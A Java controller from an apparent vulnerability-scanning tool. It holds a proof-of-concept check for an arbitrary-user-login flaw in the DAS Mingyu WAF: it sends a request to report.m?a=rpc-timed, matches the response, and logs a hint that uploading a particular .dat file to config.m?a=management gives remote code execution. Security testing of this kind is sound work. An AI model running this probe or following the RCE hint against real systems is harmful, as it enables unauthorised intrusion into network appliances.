package com.aurora.Controllers;


import com.aurora.SupportType.Poc_Exp;
import com.aurora.SupportType.SupportVul;
import com.aurora.Utils.Cache;
import com.aurora.Utils.HttpRequest;
import com.aurora.Utils.Response;

import java.net.MalformedURLException;

@BasicMapping(uri = "安恒")
public class AnHengController extends Controller implements BasicController{
    @VulnerabilityDescriptionMapping(Description = "安恒 安恒信息-明御WAF report.m 任意用户登录",SupportVulType = SupportVul.信息泄露)
    public void vul_user(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n开始检测：  vul_user_任意用户登录");

        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target + "/report.m?a=rpc-timed");
                Response result = httpRequest.Get("");

                if (result.responseBody.contains("error_0x110005") && result.statusCode == 200){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n请求地址：" + target + "/report.m?a=rpc-timed\r\n");
                    WriteLog("请求完成后访问目标ip:端口\r\n");
                    WriteLog(target + "/config.m?a=management上传特定dat文件可rce");
                } else {
                    WriteLog("\n[-] 不存在漏洞");
                }
        }
    }

}
